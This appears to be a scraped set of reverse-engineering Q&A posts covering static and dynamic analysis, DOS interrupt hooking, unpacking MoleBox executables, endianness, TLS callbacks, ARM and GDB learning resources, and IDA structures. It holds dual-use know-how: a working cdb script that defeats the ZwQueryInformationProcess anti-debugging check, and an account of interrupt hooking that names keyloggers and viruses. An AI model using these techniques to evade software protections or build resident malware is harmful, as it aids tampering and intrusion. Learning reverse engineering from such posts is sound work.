<p>Now, you've confirmed the function really decrypts something, and you want to know how it works. You'll probably want to annotate individual opcodes with comments like 'at this point, <code>eax</code> contains all bytes of the input string, xor'red with each other' or 'this doesn't do anything and seems to be nothing but obfuscation'. Tools like IDA allow you to do exactly this.</p>

<p>So the answer is: unless you have a very trivial piece of software, you won't choose one over the other. Analyzing the software consists of many tasks; for some of them, static analysis is easier, for others, dynamic analysis. Any self respecting reverse engineer will have lots of tools at his disposal and pick the right one depending on the task at hand, and quite often, will write his own tool as well to tackle some problems he has with the specific software he's working on right now.</p>

<p>Note that i've never always used the term <code>software</code> instead of <code>malware</code>, as this relates to any kind of reverse engineering, not just malware analysis.</p>
","6914"
"Interrupt interception","541","","<p>I'm currently reading <a href=""http://vxheaven.org/vx.php?fid=17"" rel=""nofollow"">40hex magazine</a> regarding virus writing in the early 90's. They talk a lot there about <code>interrupt intercepting</code> Which is something security guys from anti viruses company will try to do, and should be prevented (from virus writing point of view)</p>

<p>What is exactly <code>interrupt intercepting ?</code></p>
","<p>By intercepting or hooking interrupts in DOS you can make the system behave differently whenever an interrupt is triggered. And there are many interrupts used in x86 architecture, some are triggered by hardware (such as clock, keyboard, divide overflow/divide by zero), some are BIOS services that can be called from software and some are OS services or other services that can also be called from software. All interrupts are equally easy to hook. All you need is <code>cli</code>, replace the interrupt vector with your own one, <code>sti</code>, or use some BIOS or DOS service.</p>

<p>By hooking an interrupt you can first do your thing in your own interrupt handler and then forward the original parameters to the original interrupt handler, but you can also replace entire interrupts or specific services of chosen interrupts (without forwarding). TSRs (terminate &amp; stay resident) programs are all based on hooking interrupts (with or without interrupt forwarding). For example many DOS debuggers are TSRs, and probably many viruses too.</p>

<p>For example it's possible to write an interrupt handler for interrupt 0x13 that disables all hard drive formatting functions of BIOS interrupt 0x13, by first checking the parameters for <code>int 0x13</code>, and if the function (in <code>ah</code>) is 5, 6, 7, 0x1a ... then set the desired return values in registers and flags as you like , then <code>iret</code>, otherwise <code>jmp</code> to the original interrupt handler. You can write a TSR debugger that hooks the chosen interrupts and presents the debugger screen whenever a chosen interrupt is triggered. You can adjust the system timer interrupt frequency and then hook the timer interrupt to use it to play music eg. with AdLib or SoundBlaster. You can write a TSR keylogger, a TSR virus scanner or a TSR hard drive defragmenter. You can make the computer play ""Jingle Bells"" through PC speaker or sound card whenever the user presses Enter and it's December. The possibilities are limited only by the hardware available and the skill of the programmer.</p>
","3199"
"how do I bypass ZwQueryInformationProcess as anti-debugging protection","539","","<p>How do I defeat the <code>ZwQueryInformationProcess()</code> anti-debugging protection for the ProcessDebugPort class? 
Unlike <code>isDebuggerPresent()</code> I found this really hard to bypass in my skill... </p>

<p>Does anyone know how to bypass this api function?</p>
","<pre><code>#include ""zwopenproc.h""
int main (void) 
{
    hNtdll=GetModuleHandle(""ntdll.dll"");
    if(hNtdll) 
    {
        *(FARPROC *)&amp;ZwQIP  = GetProcAddress(hNtdll,""ZwQueryInformationProcess"");
        hProc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,GetCurrentProcessId());
        ZwQIP(hProc,ProcessImageFileName,OutBuff,sizeof(OutBuff),&amp;Rlen);
        printf(""ImageName=%wZ\n"",OutBuff);
        ZwQIP(hProc,ProcessDebugPort,&amp;DbgPort,4, &amp;Rlen);
        switch( DbgPort )
        {
        case 0xffffffff:
            printf(""some bugs are debugging us\n"");
            break;
        case 0x0:
            printf(""no bugs are debugging us\n"");
            break;
        default:
            printf (""who knows if bugs are debugging us\n"");
            break;
        }       
    }
    return 0;    
}
</code></pre>

<p><strong>executing this code without debugger</strong></p>

<pre><code>zwopenproc.exe
ImageName=\Device\HarddiskVolume4\test\zwqiproc\zwopenproc.exe
no bugs are debugging us
</code></pre>

<p><strong>executing inside debugger results in detection</strong> </p>

<pre><code>cdb -g -G zwopenproc.exe | tail -2
ImageName=\Device\HarddiskVolume4\test\zwqiproc\zwopenproc.exe
some bugs are debugging us +++++++++++++++++++++++++++++++++++++++++++++++
</code></pre>

<p><strong>executing inside debugger and overwriting the return buffer using a script results in no detection</strong></p>

<pre><code>cdb -G -c ""$$&gt;a&lt; zwqip.txt"" zwopenproc.exe  | tail -6


    Process Id  2064
    Parent Process  3716
    Base Priority 8
.  0    id: 810 create  name: zwopenproc.exe
ImageName=\Device\HarddiskVolume4\test\zwqiproc\zwopenproc.exe
no bugs are debugging us  &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;

printf ""%x\n"" , 2064
810
</code></pre>

<p><strong>contents of script file</strong></p>

<pre><code>cat zwqip.txt
bp ntdll!ZwQueryInformationProcess "".if( poi(@esp+8) != 7 ){gc} .else { !handle poi(@esp+4
) f ; | ; gu ; ed dbgport 0; gc } ""
g
</code></pre>
","13375"
"Unpack files from executable","539","","<p>I have an exe application that contains three files packed in it. I know how those files were named before packing, I have around 80% of packed files and some of main executable file binary code. I've also found out that the execution creates and uses two files in <code>\AppData\Local\Temp\</code> called <code>MBX@pid@3bytes.###</code> which contains application entry I believe. And when I scan the file header with PEiD I get <code>Nothing found [Overlay] *</code>.</p>

<p>Thats my objdump result</p>

<pre><code>application.exe:     file format pei-i386
architecture: i386, flags 0x00000102:
EXEC_P, D_PAGED
start address 0x0083db33

Characteristics 0x30f
    relocations stripped
    executable
    line numbers stripped
    symbols stripped
    32 bit words
    debugging information removed

Time/Date       Tue Dec  8 10:45:51 2009
Magic           010b    (PE32)
MajorLinkerVersion  6
MinorLinkerVersion  0
SizeOfCode      00000000
SizeOfInitializedData   00150000
SizeOfUninitializedData 00000000
AddressOfEntryPoint 0043db33
BaseOfCode      0043c000
BaseOfData      001b2000
ImageBase       00400000
SectionAlignment    00001000
FileAlignment       00001000
MajorOSystemVersion 4
MinorOSystemVersion 0
MajorImageVersion   0
MinorImageVersion   0
MajorSubsystemVersion   4
MinorSubsystemVersion   0
Win32Version        00000000
SizeOfImage     00457000
SizeOfHeaders       00001000
CheckSum        00000000
Subsystem       00000002    (Windows GUI)
DllCharacteristics  00000000
SizeOfStackReserve  00100000
SizeOfStackCommit   00001000
SizeOfHeapReserve   00100000
SizeOfHeapCommit    00001000
LoaderFlags     00000000
NumberOfRvaAndSizes 00000010

The Data Directory
Entry 0 00000000 00000000 Export Directory [.edata (or where ever we found it)]
Entry 1 0044eb2c 0000003c Import Directory [parts of .idata]
Entry 2 003dc000 0005e81a Resource Directory [.rsrc]
Entry 3 00000000 00000000 Exception Directory [.pdata]
Entry 4 00000000 00000000 Security Directory
Entry 5 00000000 00000000 Base Relocation Directory [.reloc]
Entry 6 00000000 00000000 Debug Directory
Entry 7 00000000 00000000 Description Directory
Entry 8 00000000 00000000 Special Directory
Entry 9 00000000 00000000 Thread Storage Directory [.tls]
Entry a 00000000 00000000 Load Configuration Directory
Entry b 00000000 00000000 Bound Import Directory
Entry c 0044e000 0000005c Import Address Table Directory
Entry d 0022c5f8 00000060 Delay Import Directory
Entry e 00000000 00000000 CLR Runtime Header
Entry f 00000000 00000000 Reserved

There is an import table in 6 at 0x84eb2c

The Import Tables (interpreted 6 section contents)
 vma:            Hint    Time      Forward  DLL       First
                 Table   Stamp     Chain    Name      Thunk
 0044eb2c   0044eb68 00000000 00000000 0044ecb8 0044e000

    DLL Name: KERNEL32.dll
    vma:  Hint/Ord Member-Name Bound-To
    44ebc4    537  InitializeCriticalSection
    44ebe0    408  GetProcAddress
    44ebf2    594  LocalFree
    44ebfe    667  RaiseException
    44ec10    590  LocalAlloc
    44ec1e    375  GetModuleHandleA
    44ec32    583  LeaveCriticalSection
    44ec4a    143  EnterCriticalSection
    44ec62    429  GetShortPathNameA
    44ec76    709  ResumeThread
    44ec86    925  WriteProcessMemory
    44ec9c    400  GetPrivateProfileSectionA
    44ed52    434  GetStringTypeA
    44ed42    571  LCMapStringW
    44ed32    570  LCMapStringA
    44ecfa    714  RtlUnwind
    44ed06    903  WideCharToMultiByte
    44ed1c    619  MultiByteToWideChar
    44ed64    437  GetStringTypeW

 0044eb40   0044ebb8 00000000 00000000 0044ecee 0044e050

    DLL Name: USER32.dll
    vma:  Hint/Ord Member-Name Bound-To
    44ecc6    142  DefWindowProcA
    44ecd8      2  AdjustWindowRectEx

 0044eb54   00000000 00000000 00000000 00000000 00000000

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 0             000b7000  00401000  00401000  00001000  2**2
                  CONTENTS, ALLOC, LOAD, CODE, DATA
  1 1             00029000  005b2000  005b2000  000b8000  2**2
                  CONTENTS, ALLOC, LOAD, CODE, DATA
  2 2             00001000  0062f000  0062f000  000e1000  2**2
                  CONTENTS, ALLOC, LOAD, CODE, DATA
  3 3             0005e81a  007dc000  007dc000  000e2000  2**2
                  CONTENTS, ALLOC, LOAD, CODE, DATA
  4 4             00001000  0083b000  0083b000  00141000  2**2
                  CONTENTS, ALLOC, LOAD, CODE, DATA
  5 5             0000c000  0083c000  0083c000  00142000  2**2
                  CONTENTS, ALLOC, LOAD, CODE, DATA
  6 6             00000d76  0084e000  0084e000  0014e000  2**2
                  CONTENTS, ALLOC, LOAD, CODE, DATA
  7 7             00002000  0084f000  0084f000  0014f000  2**2
                  CONTENTS, ALLOC, LOAD, CODE, DATA
</code></pre>

<p>The result I'm hoping for is extracted files that have been packed into the executable.</p>

<h2>Update</h2>

<p>I've used <code>FastScanner 3.0</code> against the application and I've found out that it was packed just as the previous one, using MoleBox Pro. Here's all the FastScanner gueses (same as in previous app).
<a href=""https://i.stack.imgur.com/x6CJB.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/x6CJB.png"" alt=""FastScanner results""></a></p>

<p>So everything seems to be just like it was, but the binary file is different and I can't unpack it in any way, when back in previous application it wasn't a problem at all. Molebox is long dead so I doubt it was packed by newer version. 
Also messing with ollydbg I've found out that the application have entry points on those two files that I've called before.</p>
","<p>It turns out that the newer version was packed just as the previous one, using same Molebox Pro. But it was messing with PE Headers at runtime so I've needed to unwrap it from those masking layers first. <a href=""https://tuts4you.com/download.php?view.3503"" rel=""nofollow noreferrer"">Scylla</a> was perfect tool for that.</p>
","16286"
"Hex representation of integer values in excess of FF (255)","538","","<p>I am learning some gdb and it is covering examining arrays. There is the following code, and I see it is 4 bytes, and how <code>a[1] = 2</code> in an array <code>int a[] = {1,2,3}</code></p>

<pre><code>(gdb) x/4xb a + 1
0x7fff5fbff570: 0x02  0x00  0x00  0x00
</code></pre>

<p>But what if a was greater than what could be shown by a single hex byte? Then how does it work for the second part? Sorry if this is unclear, I don't know how tow ord it exactly.</p>
","<p>I think you have two questions here.  The first part is how to convert from decimal to hexadecimal and back; the second part is how a multi-byte value is represented in memory.  Guntram Blohm's answer covers the first part in detail, and I'll try to muddle through an answer to the second here.</p>

<p>So, consider a multi-byte hexadecimal number...ABCD, where each letter represents a byte.  So for example in 0x03B87C43 A represents 0x03, B represents 0xB8, C represents 7C and D represent 0x43.  Finally, D is referred to as the low-order byte.  </p>

<p>Now, the various bytes can be arranged in different ways in memory; and there are two major forms that are currently in use today:</p>

<p><strong>little-endian</strong> form:</p>

<p>The low-order byte is placed at the lowest memory address, thus our example number would be
stored in memory thusly:</p>

<pre><code> 1000  1001  1002  1003   &lt;----- memory addresses, notional     
+-----+-----+-----+-----+
|  D  |  C  |  B  |  A  |
+-----+-----+-----+-----+
</code></pre>

<p>Intel processors use this form of storing multi-byte numbers.</p>

<p><strong>big-endian</strong> form:</p>

<p>The low-order byte is placed at the highest memory address, thus our example number would be 
stored in memory thusly:</p>

<pre><code> 1000  1001  1002  1003   &lt;----- memory addresses, notional     
+-----+-----+-----+-----+
|  A  |  B  |  C  |  D  |
+-----+-----+-----+-----+
</code></pre>

<p>Non-Intel SUN workstations use this form (IIRC they use a Motorola processor).</p>

<p>other forms.</p>

<p>just about any other arrangement can be used.  For example, PDP-11 used a system where 
a 32-bit value was stored in little-endian format, with the exception of each byte of the 16-bit half was swapped.  Thus our sample number would be stored in memory as:</p>

<pre><code> 1000  1001  1002  1003   &lt;----- memory addresses, notional     
+-----+-----+-----+-----+
|  C  |  D  |  A  |  B  |
+-----+-----+-----+-----+
</code></pre>

<p>Hope this helps a bit.</p>
","6058"
"IDA Strange exception before code is executed","538","","<p>I am trying to reverse a PE executable (challenge tutorial). I am putting a breakpoint on the first instruction of the program, at the entry point. There is nothing executed before. </p>

<p>I get a software breakpoint exception when I run the program. I think this is a debugger detection system. But I do not know where is the code that throws this exception, because I have not reach my program entry point. </p>

<p>The exception throws from <code>ntdll.dll</code> I want to understand how can code from <code>ntdll.dll</code> can be executed BEFORE the entry point of my binary</p>

<p>Thanks</p>
","<p>One thing that runs before the entrypoint is <a href=""http://www.hexblog.com/?p=9"" rel=""nofollow noreferrer"">TLS callbacks</a>, so check if your binary has them.</p>
","14269"
"How Do I get proficient at Reverse engineering?","537","","<p>Please bare with me as I explain this situation.</p>

<p>Maybe 10 days ago I took up the challenge of reverse engineering an Android app. Learning from scratch, I installed ADB, Apktool, Android Studio, Notepad++ with Smali highlighting etc. My approach has been to write test programs in Android studio that mirror the workings of the APK, and then decompile with Apktool to help me do Smali modifications. I've been successful in modifying the application to log all HTTP requests, headers, cookies, and post data to the android log.</p>

<p>My next challenge was to figure out how an important algorithm in the app works. This is what stumped me. I spent the last 3 or 4 days spending the majority of my day analysing Smali code making almost no progress. Apparently the algorithm is done (at least in part if not mostly) in a native library with the .so extension.</p>

<p><strong>One of the extremely frustrating things about Reverse engineering is how small the community is</strong>. There's very little resources on the web (At least compared to other things). I've probably bitten off more than I can chew. I always attempt difficult projects that are above my skill level. For this task I'm guessing I need to become very familiar with ARM and I'll have to use IDA Pro to analyse the .so file? To explain my knowledge level:</p>

<ul>
<li>I have very little experience using Ollydbg in Windows (I have slight
understanding of registers and CMP, JMP, ADD commands etc)</li>
<li>I have no
experience using IDA Pro. I'm quite new to reverse engineering, but I've had success with simple Smali modding because it's simple in
some situations.</li>
<li>I know basic Java (To be clear I'm not a complete beginner, variables, for loops, arrays, classes (to an extent) are second nature to me)</li>
<li>I know basic C++ if not more than
basic</li>
<li>I've done a lot of Vb.NET programming.</li>
<li>I feel quite knowledgeable in Python.</li>
</ul>

<p>So I'm experienced with programming but not really reverse engineering. How in over my head am I attempting to understand this complex native library (When I already know practically nothing about native libraries/JNI)? Could the professionals here please give me some specific examples of how I can get to the level where I am knowledgeable enough to complete my goal? I don't want to just give up because this is a difficult challenge. Please give me suggestions of how I can progress enough to complete my goal. I assume I'll need to learn IDA Pro and how ARM works.</p>

<p>Thanks</p>
","<blockquote>
  <p>I spent the last 3 or 4 days
  spending the majority of my day analysing Smali code making almost no
  progress.</p>
</blockquote>

<p>I know it feels like you've made ""no progress"", but I'd encourage you to not look at it that way. You spent 3 or 4 days figuring out which approaches <em>don't work</em>, which is in itself progress. And you also built up 3 or 4 days of reverse engineering experience, regardless of how fruitful the immediate outcome was.</p>

<blockquote>
  <p>Apparently the algorithm is done (at least in part if not
  mostly) in a native library with the .so extension.</p>
  
  <p>...</p>
  
  <p>How in over my head am I attempting to understand this complex native library?</p>
</blockquote>

<p>Given that you've determined that the Java code calls out to the .so library, it shouldn't be too difficult to find the native function in the .so library since the native function would be exported-by-name for JNI compatibility. This means that you don't in fact need to ""understand this complex native library"" in its entirety, but rather just the one native function in question (in addition to the functions that that function calls).</p>

<p>If the native code is not heavily obfuscated and if you have <a href=""https://www.hex-rays.com/products/decompiler/index.shtml"">Hex-Rays for ARM</a>, it should be relatively <a href=""https://www.hex-rays.com/products/decompiler/compare_arm0.shtml"">easy to understand</a> the target function. If, on the other hand, you don't have Hex-Rays, then you can use the <a href=""https://www.hex-rays.com/products/ida/support/download_demo.shtml"">evaluation version of IDA Pro</a> to disassemble the target function. You'd need to manually analyze the ARM instructions to determine what the function is doing. Although that can be tedious, ARM instructions and the architecture in general are <a href=""http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.set.architecture/index.html"">very well-documented</a>. Approach it as you would when learning any new programming language.</p>

<p>Start analyzing the function from the very first instruction, and keep high-level notes on what each instruction is doing in the context of the function. Keep track of what values get stored in what registers and how memory is used. On first-pass, your goal is to determine <em>what</em> the function is doing (based on the instructions). Once you've extrapolated <em>what</em> the function is doing, your second-pass should focus on trying to understand <em>why</em> the function is doing what it's doing. After some time, things should begin to ""click"" in your mind, you'll get that ""aha!"" moment, and you'll understand how the target algorithm works.</p>
","11769"
"Books on reversing with GDB?","535","","<p>i'm getting started with some reverse engineering lately , especially on linux and ELF format , but i'm struggling here.
For now i'm only using GDB to disassemble binaries , and even though i can read and understand the assembly code in general , i don't know ""where"" to look , or what register to check to find the Flag (i'm talking about CTFs here)
so what i'm asking for are books , or videos , something to get me used to GDB and give me the thinking methodology (if there's such a thing).
Thanks !</p>
","<p>Special for beginners Dennis Yurichev wrote this book:
<a href=""http://beginners.re/Reverse_Engineering_for_Beginners-en.pdf"" rel=""nofollow""><strong>Reverse Engineering for Beginners</strong></a></p>

<p>You can find it and download on his <a href=""http://beginners.re/"" rel=""nofollow"">site</a> for free.</p>

<blockquote>
  <p>Topics discussed: x86/x64, ARM/ARM64, MIPS, Java/JVM.</p>
  
  <p>Topics touched: Oracle RDBMS, Itanium, copy-protection dongles,
  LD_PRELOAD, stack overflow, ELF, win32 PE file format, x86-64,
  critical sections, syscalls, TLS, position-independent code (PIC),
  profile-guided optimization, C++ STL, OpenMP, win32 SEH.</p>
</blockquote>
","9225"
"Working with DOS .COM files","535","","<p>What can I do to reverse engineer a DOS .COM file? As far as debugging goes, I've looked DEBUG and DEBUGX from the creators of FreeDOS, as well as the default DEBUG command that comes with Windows. Sure, I can probably work with them and eventually figure out what I'm doing, but I feel like the process would end up being longer than necessary. Is there a better tool I can use?</p>

<p>If there are no ""better"" tools than DEBUG or DEBUGX, then what can I use to work with output from these two tools? My main goal is to create something that mimics the .COM program, but in a more manageable format (as far as code goes).</p>
","<p>I personally use <a href=""http://www.dosbox.com"">DosBox</a> debugger, which is quite complete, with a SoftICE-like interface.</p>

<p>Otherwise you can go for DOS debuggers like Turbo Debugger or CodeView.</p>
","1855"
"Why IDA Pro generate define-lack code like this?","533","","<p>Basically I us IDA Pro 6.1 on Windows 32 bit, dealing with binaries from SPEC 2006.</p>

<p>I use IDA Pro to generate asm code from the binaries, and in the .data section, I see data define like this:</p>

<pre><code>GS_ExceptionRecord _EXCEPTION_RECORD  &lt;?&gt;
GS_ContextRecord _CONTEXT  &lt;?&gt;
lclcritsects    _RTL_CRITICAL_SECTION 0Eh dup(&lt;?&gt;)
 .....
DoubleFormat    FpFormatDescriptor &lt;400h, 0FFFFFC01h, 35h, 0Bh, 40h, 3FFh&gt;
FloatFormat     FpFormatDescriptor &lt;80h, 0FFFFFF81h, 18h, 8, 20h, 7Fh&gt;  
</code></pre>

<p>Basically I can not find the definition of <strong>_EXCEPTION_RECORD</strong> ,<strong>_CONTEXT</strong> ,<strong>_RTL_CRITICAL_SECTION</strong>, <strong>FpFormatDescriptor</strong> in the generated asm code.</p>

<p>And in the code, they will be used like:</p>

<pre><code>mov     edi, DoubleFormat.precision
mov     eax, DoubleFormat.min_exp
sub     ecx, DoubleFormat.precision

mov     edi, FloatFormat.precision

mov     edi, offset lclcritsects

mov     GS_ContextRecord._Eax, eax
mov     word ptr GS_ContextRecord.SegSs, ss
pop     GS_ContextRecord.EFlags
</code></pre>

<p>So basically my questions are:</p>

<ol>
<li><p>How can I find the definition of these stuff?</p></li>
<li><p>Basically I use <strong>File-->Produce File-->Create ASM File</strong> to generate asm code for analysis, then how can I dump these definitions from IDA Pro's Structures window into this asm code?</p></li>
</ol>

<p>And what's more, it seems that I can not find the definition in Structures window even if I expand them....</p>

<p><img src=""https://i.stack.imgur.com/gxynq.png"" alt=""enter image description here""></p>
","<p>As far as I know IDA doesn't dump structure layouts as part of generated assembly listings. It does however know about all the structures that you mention. Go to the structures window, press ""<code>Insert</code>"" and name the new structure <code>CONTEXT</code>, <code>EXCEPTION_RECORD</code> or <code>RTL_CRITICAL_SECTION</code> and IDA will show the layout in the structures window.</p>

<p>You can then open the ""<code>Local Type</code>s"" windows and dump all of the structure layouts as a C header file (right click ""<code>Export to header file</code>"". It still doesn't get you the assembly syntax you want, but it is about as close as I know how to make IDA get to what you want.</p>
","3721"